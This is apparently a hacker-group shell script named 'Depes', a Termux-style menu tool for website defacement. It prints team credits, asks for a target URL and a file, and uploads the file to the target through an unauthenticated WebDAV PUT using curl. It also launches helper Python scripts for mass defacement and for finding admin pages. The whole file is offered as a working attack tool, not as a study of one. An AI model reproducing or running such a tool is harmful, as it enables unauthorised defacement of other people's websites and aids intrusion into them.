#usr/bin/sh
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[31;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
clear
figlet -f future "Depes" | lolcat
echo $indigo
echo $red"////////////////////////////////////////////////////////////////"
echo $green"  Author    : MrC3nd0l"
echo $yellow"  Team      : D45H7"
echo $purple"  Thx to    : L1nUx3R - MrRed - MR.B1GSMOK3 - D45H7"
echo $white"////////////////////////////////////////////////////////////////"
echo "(Df) Deface (Webdav)" | lolcat
echo "(Ms) Mass-Deface" | lolcat
echo "(Ad) Admin Finder" | lolcat
echo "(X)  Exit" | lolcat
echo "(I)  Info" | lolcat
echo $purple"___________________________________"
echo $white"NOTE : STORE THE SCRIPT IN INTERNAL STORAGE" 
echo $purple"___________________________________"
echo $white ",__"$green"root@D45H7"$cyan" ~/Operation"$white
read -p " •__# "  tod

if [ $tod = "Df" ] || [ $tod = "Df" ]
then
echo "                                          "
figlet -f future "W E B D A V"
echo $green "Target?"
echo $white ",__"$green"root@D45H7"$cyan" ~/Operation"$white
read -p " •__# "  tg
echo $green "Script?"
echo $white ",__"$green"root@D45H7"$cyan" ~/Operation"$white
read -p " •__# "  sc
curl -T /storage/emulated/0/$sc $tg
echo $green"-}>>>>>>>} Result = $tg/$sc "
echo $cyan"("$yellow"B"$cyan")"$white"back "$cyan"("$yellow"X"$cyan")"$white"Exit"
read -p "(B/X) " back
fi

if [ $tod = "Ms" ] || [ $tod = "Ms" ]
then
echo $yellow
figlet -f future "Mass-Deface" | lolcat
figlet -f bubble "EXPLOIT" | lolcat
echo $green"*******************************"
echo $white"|NOTE: FILE MUST IN DIRECTORY |"
echo $green"*******************************"
echo "Start Mass-Deface? (y/n)" | lolcat
read -p "~# " apa
fi

if [ $tod = "Ad" ] || [ $tod = "Ad" ]
then
python2 adfin.py
fi

if [ $tod = "I" ] || [ $tod = "i" ]
then
echo $red"################# INFO ####################"
echo $indigo"__________________________________________"
echo $green"AUTHOR : MrC3nd0l		"
echo $purple"GITHUB : https://github.com/MrC3nd0l"
echo $green"OFFICIAL D45H7"
echo "L1nUx3R - MrRed - MrC3nd0l - i1000
MrM3GR0 - Mr_k13 - closeUp - MR.KEHELADACK -
mr.ZΞX - Bakong Atjeh - predator07 -
L0x10xS - tnM3T30r - MR•A - Mr.DH17 -
EvCf1703 - Mr.D45H||Cyber" | lolcat
echo $white"################# INFO ####################"
echo $indigo"__________________________________________"
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "(B/X) " back
fi

if [ $tod = "X" ] || [ $tod = "x" ]
then
echo "
1.i1000
2. Mr.M3GR0
3. C¥B3R•CR1M3)Mr_k13
4. D45H|∆$¢•closeUp™
5.MR.KEHELADACK
6. Liee•cyber™
7. Đ3C|SSCmr.ZΞXfirsthWCF
8. Bakong Atjeh🦠⁴5
9.🇦🇲#predator07#🇦🇲
10. D45H7|L0xS10xS•√
11.tnM3T30r
12.༒BCA•||MR•A•|D4SH
13.Mr.DH17
14. EvCf1703
15. Mr.D45H||Cyber" | lolcat
exit
clear
fi


if [ $back = "B" ] || [ $back = "b" ]
then
sh Depes.sh
fi

if [ $back = "X" ] || [ $back = "x" ]
then
clear
fi

if [ $apa = "Y" ] || [ $apa = "y" ]
then
clear
python2 massdeface.py
exit
fi

if [ $apa = "N" ] || [ $apa = "n" ]
then
clear
sh Depes.sh
fi
